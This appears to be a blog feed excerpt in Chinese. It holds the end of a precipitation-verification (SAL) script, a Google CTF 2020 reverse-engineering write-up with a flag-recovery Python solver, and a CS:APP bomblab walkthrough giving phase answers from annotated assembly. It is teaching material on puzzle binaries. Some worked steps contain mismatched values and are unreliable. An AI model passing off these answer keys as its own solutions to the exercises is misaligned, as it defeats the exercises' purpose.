class="line">    print(<span class="string">"S = "</span>, S)</span><br><span class="line">    print(<span class="string">"A = "</span>, A)</span><br><span class="line">    print(<span class="string">"L = "</span>, L)</span><br><span class="line"><span class="comment">#     print("L1 = ", L1)</span></span><br><span class="line"><span class="comment">#     print("L2 = ", L2)</span></span><br><span class="line"><span class="comment">#     print("NObjects_obs = ", NObjects_obs)</span></span><br><span class="line"><span class="comment">#     print("NObjects_mod = ", NObjects_mod)</span></span><br><span class="line"><span class="comment">#     print("R_max_obs = ", R_max_obs)</span></span><br><span class="line"><span class="comment">#     print("R_max_mod = ", R_max_mod)</span></span><br><span class="line"><span class="comment">#     print("threshold_obs = ", threshold_obs)</span></span><br><span class="line"><span class="comment">#     print("threshold_mod = ", threshold_mod)</span></span><br><span class="line"><span class="comment">#     print()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_SAL</span><span class="params">(filename1, filename2)</span>:</span></span><br><span class="line">    <span class="comment">#预测</span></span><br><span class="line">    EC_fst = np.load(filename1)</span><br><span class="line">    file_fst = EC_fst[<span class="string">'f'</span>]</span><br><span class="line">    result_fst = file_fst[<span class="number">0</span>].reshape(<span class="number">210</span>,<span class="number">211</span>)</span><br><span class="line">    <span class="comment">#真值</span></span><br><span class="line"></span><br><span class="line">    EC_obs = np.load(filename2)</span><br><span class="line">    file_obs = EC_obs[<span class="string">'l'</span>]</span><br><span class="line">    result_obs = file_obs[<span class="number">0</span>].reshape(<span class="number">210</span>,<span class="number">211</span>)</span><br><span class="line">    PrintResultSAL(result_fst,result_obs)</span><br><span class="line"></span><br><span class="line"><span class="comment">#之前强降水数据集使用例子</span></span><br><span class="line"><span class="comment">#matrix_SAL('testset_ECrainPredi_03h_202008.npz','../CMPA/08/testset_CMPA_03h_202008.npz')</span></span><br></pre></td></tr></table></figure>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ol>
<li><a href="http://r7wiw08xi.hn-bkt.clouddn.com/Wernli2008.pdf" target="_blank" rel="noopener">wernli2008原文</a></li>
<li><a href="http://r7wiw08xi.hn-bkt.clouddn.com/%E4%B8%80%E7%AF%87%E5%85%B6%E4%BB%96%E4%BA%BA%E7%9A%84%E6%80%BB%E7%BB%93%E2%80%94%E2%80%94SAL%20Method%20for%20precipitation%20Verification.pdf" target="_blank" rel="noopener">一篇较好的总结资料</a></li>
</ol>
]]></content>
      <categories>
        <category>降水评估指标</category>
      </categories>
      <tags>
        <tag>SAL</tag>
      </tags>
  </entry>
  <entry>
    <title>beginner</title>
    <url>/2020/09/07/10-04/</url>
    <content><![CDATA[<h4 id="file文件"><a href="#file文件" class="headerlink" title="file文件"></a>file文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@winter-ubuntu16:~&#x2F;googlectf&#x2F;reverse-beginner$ file a.out </span><br><span class="line">a.out: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, BuildID[sha1]&#x3D;e3a5d8dc3eee0e960c602b9b2207150c91dc9dff, for GNU&#x2F;Linux 3.2.0, not strippd</span><br></pre></td></tr></table></figure>
<p>ELF二进制文件，64位，x86-64架构，LSB说明是小端的（MSB是大端的）</p>
<h4 id="执行文件"><a href="#执行文件" class="headerlink" title="执行文件"></a>执行文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@winter-ubuntu16:~&#x2F;googlectf&#x2F;reverse-beginner$ .&#x2F;a.out </span><br><span class="line">Flag: winter</span><br><span class="line">FAILURE</span><br></pre></td></tr></table></figure>
<p>一个输入点，判断对错</p>
<h4 id="查看字符串"><a href="#查看字符串" class="headerlink" title="查看字符串"></a>查看字符串</h4><p><img src="/2020/09/07/10-04/image-20200905153614666.png" alt="image-20200905153614666"></p>
<p>给定的字符串里面有CTF{，很可能是flag的一部分</p>
<h4 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h4><p><img src="/2020/09/07/10-04/image-20200905160629829.png" alt="image-20200905160629829"></p>
<p><code>__isoc99_scanf(&quot;%15s&quot;, &amp;v5);</code>规定了最多输入15个字符，flag很有可能就是15个。</p>
<p><img src="/2020/09/07/10-04/image-20200905160714290.png" alt="image-20200905160714290"></p>
<h4 id="simd指令"><a href="#simd指令" class="headerlink" title="simd指令"></a>simd指令</h4><p>全称single instruction multiple data，即单指令多数据运算</p>
<p>其目的就在于帮助CPU实现数据并行，提高运算效率。</p>
<h5 id="shuffle"><a href="#shuffle" class="headerlink" title="shuffle"></a>shuffle</h5><p>选取源寄存器的任意字节重新排布到目的寄存器。</p>
<p>通俗来讲：就是将原来寄存器里面字节排列，按你的要求打乱顺序，最后将打乱顺序的存入目的寄存器</p>
<p>网上可以搜到它的伪代码描述</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">char a[16]; &#x2F;&#x2F; input a</span><br><span class="line">　　char b[16]; &#x2F;&#x2F; input b</span><br><span class="line">　　char r[16]; &#x2F;&#x2F; output r</span><br><span class="line"> </span><br><span class="line">　　for (i&#x3D;0; i &lt; 16; i++)</span><br><span class="line">   　　r[i] &#x3D; (b[i] &lt; 0) ? 0 : a[b[i] % 16];</span><br></pre></td></tr></table></figure>
<p><a href="https://www.cnblogs.com/celerychen/archive/2013/03/29/2989254.html" target="_blank" rel="noopener">https://www.cnblogs.com/celerychen/archive/2013/03/29/2989254.html</a></p>
<p><img src="/2020/09/07/10-04/image-20200905162233511.png" alt="image-20200905162233511"></p>
<p><code>13 12 10 08 04 15 03 14 09 11 05 01 07 06 02</code></p>
<p>假设我们输入的值存放在a[16]数组里面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">索引:  1     2     3     4     5     6     7     8     9     10     11     12     13     14     15 </span><br><span class="line">目的：a[13] a[12] a[10] a[08] a[04] a[15] a[03] a[14] a[09] a[11]  a[05]  a[01]  a[07]   a[06]  a[02]</span><br></pre></td></tr></table></figure>
<h5 id="add32"><a href="#add32" class="headerlink" title="add32"></a>add32</h5><p>每32位（4个字节）做整形加法运算，但是进位不会从一个4字节的包传输到另一个：</p>
<p><img src="/2020/09/07/10-04/image-20200905162639108.png" alt="image-20200905162639108"></p>
<h5 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h5><p>做异或操作</p>
<p><img src="/2020/09/07/10-04/image-20200905162718446.png" alt="image-20200905162718446"></p>
<p>因为程序是小端的，所以实际要倒过来，可以通过右键array变过来。</p>
<p><img src="/2020/09/07/10-04/image-20200906230824340.png" alt="image-20200906230824340"></p>
<h4 id="拼凑flag"><a href="#拼凑flag" class="headerlink" title="拼凑flag"></a>拼凑flag</h4><p>假设前四个字符就是CTF{，我们根据以上规则进行实验。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shuffle &#x3D; [2, 6, 7, 1, 5, 0xB, 9, 0xE, 3, 0xF, 4, 8, 0xA, 0xC,0xD, 0]</span><br></pre></td></tr></table></figure>
<p>根据shuffle的规则，打乱顺序后的字符串如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a[2] a[6] a[7] a[1] a[5] a[11] a[9] a[14] a[3] a[15] a[4] a[8] a[10] a[12] a[13] a[0]</span><br><span class="line"> 0    1    2    3    4    5     6    7     8    9     10   11   12    13    14    15</span><br></pre></td></tr></table></figure>
<p>所以，一开始我们知道第三个（也就是a[3]）是’{‘。</p>
<p>a[3]被放在了索引8的位置，我们继续计算add和xor，就可以得到a[8]了，因为操作后的要和之前的一样。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x7B + ADD[8] &#x3D; 0x7B + 0x37 &#x3D; 0xB2</span><br><span class="line">0xB2 ^ XOR[8] &#x3D; 0xB2 ^ 0xD4 &#x3D; 0x66 &#x3D;&gt; flag[8] &#x3D; &#39;f&#39;</span><br><span class="line">CTF&#123; _ _ _ _ f _ _ _ _ _ &#125;\0</span><br></pre></td></tr></table></figure>
<p>所以，就有了</p>
<p><code>3 =&gt; 8 =&gt; 11 =&gt; 5 =&gt; 4 =&gt; 10 =&gt; 12 =&gt; 13 =&gt; 14 =&gt; 7</code>，依次类推出来所有的flag</p>
<p>但是，这里还有注意的是进位。</p>
<p>11 =&gt; 5</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x4D + ADD[5] &#x3D; 0x4D + 0xDE &#x3D; 0x12B</span><br><span class="line">0x2B ^ XOR[5] &#x3D; 0x2B ^ 0x1A &#x3D; 0x31 &#x3D;&gt; flag[5] &#x3D; &#39;1&#39;</span><br><span class="line">CTF&#123; _ 1 _ _ f _ _ M _ _ &#125;\0</span><br></pre></td></tr></table></figure>
<p>这里发生了进位，需要将进位添加到add[6]里面去</p>
<p>其他的也一样。</p>
<p><img src="/2020/09/07/10-04/image-20200906235018243.png" alt="image-20200906235018243"></p>
<p>出现单个数字的，说明进位到了什么索引。</p>
<p>分别add[6]、add[7]、add[8]都发生了进位，但是add[6]加上进位是在第六位计算之前，所以没事。add[8]是add[7]进位，add[7]在四字节分割中是第二个四字节的末尾，所以他的进位无法添加到下一个有效字节，不用管它。</p>
<p>所以，最后只有add[7]在结束后都需要重新计算。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a[14] + ADD[7] &#x3D; 0x7D + 0xFF &#x3D; 0x17C</span><br><span class="line">0x7C ^ XOR[7] &#x3D; 0x7C ^ 0x38 &#x3D; 0x44 &#x3D;&gt; flag[7] &#x3D; &#39;D&#39;</span><br><span class="line">CTF&#123; S 1 M D f 0 r M 3 ! &#125;\0</span><br></pre></td></tr></table></figure>
<p>由于a[7]变了，相应的a[2]也会变</p>
<p>add[1]有进位（0x4d + 0xbe == 0x10b），add[2]=0xae</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a[7] + ADD[7] &#x3D; 0x44 + 0xae &#x3D; 0xf2</span><br><span class="line">0x7C ^ XOR[7] &#x3D; 0xf2 ^ 0xb4 &#x3D; 0x46 &#x3D;&gt; flag[7] &#x3D; &#39;F&#39;</span><br><span class="line">CTF&#123; S 1 M D f 0 r M 3 ! &#125;\0</span><br></pre></td></tr></table></figure>
<p>我们知道前面三个，这个也算是验证吧。</p>
<p>exp如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import binascii</span><br><span class="line">flag &#x3D; [&#39;C&#39;,&#39;T&#39;,&#39;F&#39;,&#39;&#123;&#39;,0,0,0,0,0,0,0,0,0,0,0,&#39;\0&#39;]</span><br><span class="line"></span><br><span class="line">add &#x3D; [0xEF, 0xBE, 0xAD, 0xDE, 0xAD, 0xDE, 0xE1, 0xFE, 0x37,0x13, 0x37, 0x13, 0x66, 0x74, 0x63, 0x67]</span><br><span class="line">xor &#x3D; [0x76, 0x58, 0xB4, 0x49, 0x8D, 0x1A, 0x5F, 0x38, 0xD4,0x23, 0xF8, 0x34, 0xEB, 0x86, 0xF9, 0xAA]</span><br><span class="line">shuffle &#x3D; [2, 6, 7, 1, 5, 0xB, 9, 0xE, 3, 0xF, 4, 8, 0xA, 0xC,0xD, 0]</span><br><span class="line">index &#x3D; [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]</span><br><span class="line">start &#x3D; 3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def bianli(number):</span><br><span class="line">	for i in range(16):#0-15</span><br><span class="line">		if(shuffle[i] &#x3D;&#x3D; number):</span><br><span class="line">			return i</span><br><span class="line">for i in range(14):</span><br><span class="line">	h &#x3D;  binascii.b2a_hex(flag[start])</span><br><span class="line">	start &#x3D; bianli(start)</span><br><span class="line">	a &#x3D; chr(((eval(&quot;0x&quot;+h) +add[start])&amp;0xff)^xor[start])</span><br><span class="line">	if(((eval(&quot;0x&quot;+h) +add[start])&amp;0xff00)!&#x3D;0):</span><br><span class="line">		if((start+1)%4 !&#x3D; 0):</span><br><span class="line">			print(start+1)</span><br><span class="line">			add[start+1]+&#x3D;(eval(&quot;0x&quot;+h) +add[start])&gt;&gt;8</span><br><span class="line">	print(&quot;number:&quot;,start)</span><br><span class="line">	print(&quot;\nsymbol:&quot;,a)</span><br><span class="line">	flag[start]&#x3D;a	</span><br><span class="line">	if(i&#x3D;&#x3D;9):</span><br><span class="line">		start &#x3D; 15</span><br><span class="line">	if(i&#x3D;&#x3D;11):</span><br><span class="line">		start &#x3D; 14</span><br><span class="line"></span><br><span class="line">flag[2]&#x3D;&#39;F&#39;#flag[2]通过重新计算就是&#39;F&#39;,由于a[7]变了</span><br><span class="line"></span><br><span class="line">print(&quot;add:&quot;)</span><br><span class="line">for i in range(15):</span><br><span class="line">	print(hex(add[i]))</span><br><span class="line"></span><br><span class="line">print(&quot;flag:&quot;,flag)</span><br></pre></td></tr></table></figure>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://github.com/Moji99/googleCTF2020-BEGINNER" target="_blank" rel="noopener">https://github.com/Moji99/googleCTF2020-BEGINNER</a></p>
]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>googlectf 2020</tag>
      </tags>
  </entry>
  <entry>
    <title>bomblab</title>
    <url>/2020/07/24/04-05/</url>
    <content><![CDATA[<p>总共六个阶段</p>
<p>任务是，运行时，有六个阶段，每个阶段输入一个字符串，如果输入错误，炸弹爆炸。这次给的文件不全，所以，需要看汇编了解程序。</p>
<p>导出汇编代码：<code>unix&gt; objdump -d &gt; obj.txt</code></p>
<h3 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#main这块关于第一阶段的代码</span><br><span class="line">400e32:	e8 67 06 00 00       	callq  40149e &lt;read_line&gt;</span><br><span class="line">400e37:	48 89 c7             	mov    %rax,%rdi						#读入的放入rdi</span><br><span class="line">400e3a:	e8 a1 00 00 00       	callq  400ee0 &lt;phase_1&gt;</span><br><span class="line">400e3f:	e8 80 07 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">400e44:	bf a8 23 40 00       	mov    $0x4023a8,%edi</span><br><span class="line">400e49:	e8 c2 fc ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br></pre></td></tr></table></figure>
<p>读入字符串，字符串地址存放在<code>rdi</code>中，然后呼叫<code>phase_1</code>函数，phase_defused和put都是输出提示性字符串</p>
<p>每个阶段这块代码类似，字符串在<code>rdi</code>中。不再累赘。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#phase_1函数</span><br><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi					#把0x402400放入esi</span><br><span class="line">  400ee9:	e8 4a 04 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:	85 c0                	test   %eax,%eax						#执行and操作，如果两个相等，zf&#x3D;1</span><br><span class="line">  400ef0:	74 05                	je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:	e8 43 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  400efb:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>将0x402400地址存入<code>esi</code>，然后调用<code>strings_not_equal</code>函数，对返回结果<code>eax</code>进行查看，等于0成功，否则，炸弹爆炸</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#strings_not_equal函数</span><br><span class="line">0000000000401338 &lt;strings_not_equal&gt;:										&#x2F;&#x2F;相等，返回0，不相等，返回1</span><br><span class="line">  401338:	41 54                	push   %r12</span><br><span class="line">  40133a:	55                   	push   %rbp</span><br><span class="line">  40133b:	53                   	push   %rbx</span><br><span class="line">  40133c:	48 89 fb             	mov    %rdi,%rbx						#读入的</span><br><span class="line">  40133f:	48 89 f5             	mov    %rsi,%rbp						#0x402400</span><br><span class="line">  401342:	e8 d4 ff ff ff       	callq  40131b &lt;string_length&gt;			#把字符串放入rdi</span><br><span class="line">  401347:	41 89 c4             	mov    %eax,%r12d         				#读入的长度放入r12d</span><br><span class="line">  40134a:	48 89 ef             	mov    %rbp,%rdi</span><br><span class="line">  40134d:	e8 c9 ff ff ff       	callq  40131b &lt;string_length&gt;</span><br><span class="line">  401352:	ba 01 00 00 00       	mov    $0x1,%edx				</span><br><span class="line">  401357:	41 39 c4             	cmp    %eax,%r12d						#0x402400的长度与读入的长度cmp</span><br><span class="line">  40135a:	75 3f                	jne    40139b &lt;strings_not_equal+0x63&gt;	#如果不相等，eax&#x3D;0x1,结束</span><br><span class="line">  </span><br><span class="line">																			#相等要返回长度，所以接下来要找到最前面0的位置(二分)</span><br><span class="line">  40135c:	0f b6 03             	movzbl (%rbx),%eax						#如果相等，eax&#x3D;读入地址里面的内容</span><br><span class="line">																			#movzbl指令负责拷贝一个字节，并用0填充其目的操作数中的其余各位，这种扩展方式叫“零扩展”。</span><br><span class="line">  40135f:	84 c0                	test   %al,%al							#如果al&#x3D;0，eax&#x3D;0，结束</span><br><span class="line">  401361:	74 25                	je     401388 &lt;strings_not_equal+0x50&gt;	#如果al！&#x3D;0</span><br><span class="line">  401363:	3a 45 00             	cmp    0x0(%rbp),%al					#第一个字节相比				</span><br><span class="line">  401366:	74 0a                	je     401372 &lt;strings_not_equal+0x3a&gt;	#相等，rbx、rbp+1</span><br><span class="line">  401368:	eb 25                	jmp    40138f &lt;strings_not_equal+0x57&gt;	#不相等，eax&#x3D;0x1，返回</span><br><span class="line">  40136a:	3a 45 00             	cmp    0x0(%rbp),%al					#继续比较下一个字节(rbp+1)</span><br><span class="line">  40136d:	0f 1f 00             	nopl   (%rax)							#nop 是什么都不做的意思（no-operation）。这里填入 nop 是为了让后面的函数对齐到 16 字节处</span><br><span class="line">  401370:	75 24                	jne    401396 &lt;strings_not_equal+0x5e&gt;	#后面的字节不相等，eax&#x3D;1，返回</span><br><span class="line">  401372:	48 83 c3 01          	add    $0x1,%rbx						#相等，继续加</span><br><span class="line">  401376:	48 83 c5 01          	add    $0x1,%rbp</span><br><span class="line">  40137a:	0f b6 03             	movzbl (%rbx),%eax						#eax&#x3D;下一个地址里面的内容</span><br><span class="line">  40137d:	84 c0                	test   %al,%al							#继续比较al是否是0</span><br><span class="line">  40137f:	75 e9                	jne    40136a &lt;strings_not_equal+0x32&gt;	#不是，回去</span><br><span class="line">  401381:	ba 00 00 00 00       	mov    $0x0,%edx						#是，eax&#x3D;0</span><br><span class="line">  401386:	eb 13                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  401388:	ba 00 00 00 00       	mov    $0x0,%edx</span><br><span class="line">  40138d:	eb 0c                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  40138f:	ba 01 00 00 00       	mov    $0x1,%edx</span><br><span class="line">  401394:	eb 05                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  401396:	ba 01 00 00 00       	mov    $0x1,%edx</span><br><span class="line">  40139b:	89 d0                	mov    %edx,%eax</span><br><span class="line">  40139d:	5b                   	pop    %rbx</span><br><span class="line">  40139e:	5d                   	pop    %rbp</span><br><span class="line">  40139f:	41 5c                	pop    %r12</span><br><span class="line">  4013a1:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>通过分析可得，当<code>rdi</code>、<code>rsi</code>两个寄存器中地址对应的字符串内容，相等时，返回0，否则，返回1</p>
<p>综上：</p>
<p>当输入的字符串的内容和<code>0x402400</code>地址中的内容相等，即可通过。</p>
<p><img src="/2020/07/24/04-05/image-20200722183034318.png" alt="image-20200722183034318"></p>
<p>Border relations with Canada have never been better.</p>
<h3 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:	55                   	push   %rbp</span><br><span class="line">  400efd:	53                   	push   %rbx</span><br><span class="line">  400efe:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  </span><br><span class="line">  400f02:	48 89 e6             	mov    %rsp,%rsi					#当前栈顶备份rsi</span><br><span class="line">  400f05:	e8 52 05 00 00       	callq  40145c &lt;read_six_numbers&gt;	#主要是判断是否输入了六个数</span><br><span class="line">  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)					#栈顶数据必须是1</span><br><span class="line">  400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt;		#如果相等，rbx&#x3D;rsp+0x4；rbp&#x3D;rsp+0x18，否则，爆炸</span><br><span class="line">																		#rbp指向最后一个数字的位置,rbx指向rsp下面一个单元</span><br><span class="line">  400f10:	e8 25 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax				#eax初始化是rsp栈顶的数据</span><br><span class="line">  400f1a:	01 c0                	add    %eax,%eax					#eax×2</span><br><span class="line">  400f1c:	39 03                	cmp    %eax,(%rbx)					#eax和rbx的值比较</span><br><span class="line">																		#(也就是下一个单元的数据和上一个单元比较)</span><br><span class="line">  400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt;		</span><br><span class="line">																		#如果相等，rbx+0x4，否则，爆炸</span><br><span class="line">  400f20:	e8 15 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:	48 83 c3 04          	add    $0x4,%rbx					rbx和rbp比较，rbx和rbp如果不相等(没走完6个)，继续循环</span><br><span class="line">  400f29:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt;		#rbx和rbp比较如果想等，结束</span><br><span class="line">  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx				#rbx(来判断的指针)，从rsp下面第一个数开始走			</span><br><span class="line">  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp		</span><br><span class="line">  400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:	48 83 c4 28          	add    $0x28,%rsp					#六个走完，就结束了</span><br><span class="line">  400f40:	5b                   	pop    %rbx</span><br><span class="line">  400f41:	5d                   	pop    %rbp</span><br><span class="line">  400f42:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>所以，phase_2函数做的，就是将栈中的前六个单元的数据，相邻两个比较，如果2×上面单元地址 = 下面单元地址，才不会爆炸，又因为第一个是1（esp的值），六个，所以可以得到：</p>
<p>栈内情况如下</p>
<p> <img src="/2020/07/24/04-05/image-20200722234727371.png" alt="image-20200722234727371"></p>
<p>对于<code>read_six_numbers</code>函数，主要看一下几行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40148a:	e8 61 f7 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;		#输入h函数</span><br><span class="line">40148f:	83 f8 05             	cmp    $0x5,%eax					   #eax存放输入的参数个数，说明至少六个才行（eax返回6）</span><br><span class="line">401492:	7f 05                	jg     401499 &lt;read_six_numbers+0x3d&gt;	#JG： 大于转移指令。</span><br><span class="line">401494:	e8 a1 ff ff ff       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401499:	48 83 c4 18          	add    $0x18,%rsp						#小于0x5，顺利退出</span><br><span class="line">40149d:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>将参数压栈的操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400bf0 &lt;__isoc99_sscanf@plt&gt;:</span><br><span class="line">  400bf0:	ff 25 92 24 20 00    	jmpq   *0x202492(%rip)        # 603088 &lt;_GLOBAL_OFFSET_TABLE_+0xa0&gt;</span><br><span class="line">  400bf6:	68 11 00 00 00       	pushq  $0x11</span><br><span class="line">  400bfb:	e9 d0 fe ff ff       	jmpq   400ad0 &lt;_init+0x10&gt;		# jmpq 就是jmp 指令，q表示跳转到64位地址。</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400ad0 &lt;getenv@plt-0x10&gt;:</span><br><span class="line">  400ad0:	ff 35 1a 25 20 00    	pushq  0x20251a(%rip)        # 602ff0 &lt;_GLOBAL_OFFSET_TABLE_+0x8&gt;</span><br><span class="line">  400ad6:	ff 25 1c 25 20 00    	jmpq   *0x20251c(%rip)        # 602ff8 &lt;_GLOBAL_OFFSET_TABLE_+0x10&gt;</span><br><span class="line">  400adc:	0f 1f 40 00          	nopl   0x0(%rax)</span><br></pre></td></tr></table></figure>
<p>应该是0x400ad0做的，，，（猜测）</p>
<p>1 2 4 8 16 32</p>
<h3 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp						</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx					#rcx &#x3D; rsp + 0xc</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx					#rdx &#x3D; rsp + 0x8</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi					#esi &#x3D; 0x4025cf</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax						#eax &#x3D; 0x0</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax						</span><br><span class="line">  400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;			#至少要输入两个参数</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)					#rsp + 0x8 与 0x7 做比较，需要小于</span><br><span class="line">  400f6f:	77 3c                	ja     400fad &lt;phase_3+0x6a&gt;			#rsp + 0x8 大于 0x7 就爆炸了</span><br><span class="line">  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax					#eax &#x3D; rsp + 0x8</span><br><span class="line">  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)				#switch结构</span><br><span class="line">  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax						#eax &#x3D; 0xcf 	207</span><br><span class="line">  400f81:	eb 3b                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax						#eax &#x3D; 0x2c3		rsp &#x3D; eax - 0xc</span><br><span class="line">  400f88:	eb 34                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax						#eax &#x3D; 0x100		256						</span><br><span class="line">  400f8f:	eb 2d                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:	b8 85 01 00 00       	mov    $0x185,%eax						#eax &#x3D; 0x185	389</span><br><span class="line">  400f96:	eb 26                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax						#eax &#x3D; 0xce		206</span><br><span class="line">  400f9d:	eb 1f                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax						#eax &#x3D; 0x2aa	682</span><br><span class="line">  400fa4:	eb 18                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax						#eax &#x3D; 0x147	327</span><br><span class="line">  400fab:	eb 11                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:	e8 88 04 00 00       	callq  40143a &lt;explode_bomb&gt;			#爆炸</span><br><span class="line">  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400fb7:	eb 05                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax</span><br><span class="line">  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax					#比较eax 和 rsp + 0xc</span><br><span class="line">  400fc2:	74 05                	je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line">  400fc4:	e8 71 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  400fcd:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>这个阶段，只需要对该代码有较好的理解即可，主要是对分支（switch语句）的理解。</p>
<p>对于sscanf函数，原型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sscanf(const char* str,const char* format,...);</span><br></pre></td></tr></table></figure>
<p>在这里，<code>esi</code>里面存放的是format的内容，<code>[esp+4]</code>、<code>[esp+0xc]</code>里面分别是第一第二个参数</p>
<p><img src="/2020/07/24/04-05/image-20200723015133883.png" alt="image-20200723015133883"></p>
<p><img src="/2020/07/24/04-05/image-20200723020444125.png" alt="image-20200723020444125"></p>
<p>根据format和这两条语句，可以知道，参数为2。</p>
